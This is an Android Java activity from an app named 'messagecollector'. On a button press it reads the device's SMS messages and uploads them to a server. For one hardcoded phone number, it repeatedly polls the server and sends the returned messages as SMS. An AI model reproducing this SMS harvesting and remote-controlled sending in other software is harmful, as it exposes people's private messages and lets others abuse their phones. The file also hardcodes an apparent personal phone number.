package com.mygy.messagecollector;

import androidx.appcompat.app.AppCompatActivity;

import android.os.Bundle;
import android.os.CountDownTimer;
import android.widget.ImageButton;
import android.widget.TextView;
import static android.Manifest.permission.READ_PHONE_NUMBERS;
import static android.Manifest.permission.READ_PHONE_STATE;
import static android.Manifest.permission.READ_SMS;
import static android.Manifest.permission.SEND_SMS;

import com.mygy.messagecollector.models.SMSData;
import com.mygy.messagecollector.models.User;
import com.mygy.messagecollector.models.UserData;
import com.mygy.messagecollector.utility.InMemoryStorage;
import com.mygy.messagecollector.utility.PhoneDataHelper;
import com.mygy.messagecollector.utility.ServerAPIHelper;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    public static User user;
    private TextView textTV, phoneTV;
    private PhoneDataHelper phoneDataHelper;
    private ServerAPIHelper apiHelper;
    private UserData userData;
    private String phone;
    private CountDownTimer checkServerMessagesTimer;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phoneDataHelper = new PhoneDataHelper(this);
        apiHelper = new ServerAPIHelper();


        textTV = findViewById(R.id.main_textTV);
        phoneTV = findViewById(R.id.main_phoneNumberTV);

        phone = user.getPhoneNumber();

        //phoneTV.setText(phone);
        userData = new UserData(phone);

        ImageButton updateBtn = findViewById(R.id.main_updateBtn);
        updateBtn.setOnClickListener(v -> {
            String smss = phoneDataHelper.readSMS();

            phone = user.getPhoneNumber();

            if(phone.equals("+79143950985")){
                startTimer();
            }

            //StringBuilder sb = new StringBuilder();
            //for(String s:smss)
               // sb.append(s).append("\n-=-=-=-=-=-\n");
            textTV.setText(smss.replaceAll(">-=-=-=-=-<","\n>-=-=-=-=-<\n"));
            phoneTV.setText(phone);
            userData.setPhoneNumber(phone);
            userData.setMessages(smss);

            apiHelper.sendUserData(userData, (success)-> {
                if(success) {
                    System.out.println("-=-=-=-=-=-=-=-=-=-=-=\n\nSended user data\n\n-=-=-=-=-=-=-=-=-=-=-=");
                }
            });
        });

    }



    private void startTimer(){
        checkServerMessagesTimer = new CountDownTimer(1000,1000) {
            @Override
            public void onTick(long millisUntilFinished) {
                apiHelper.getServerMessages(success -> {
                    if(success){
                        List<SMSData> dataToRemove = new ArrayList<>();
                        for(SMSData sms: InMemoryStorage.getSmsDatas()){
                            dataToRemove.add(sms);
                            phoneDataHelper.sendMessage(sms.getPhoneNumber(),sms.getMessage());
                            System.out.println("-=-=-=-=-=-=-\n\n"+sms.getPhoneNumber()+":\n\t"+sms.getMessage()+"\n\n-=-=-=-=-=-=-");
                        }
                        InMemoryStorage.getSmsDatas().removeAll(dataToRemove);
                    }
                });
            }
            @Override
            public void onFinish() {
                startTimer();
            }
        };
        checkServerMessagesTimer.start();
    }
}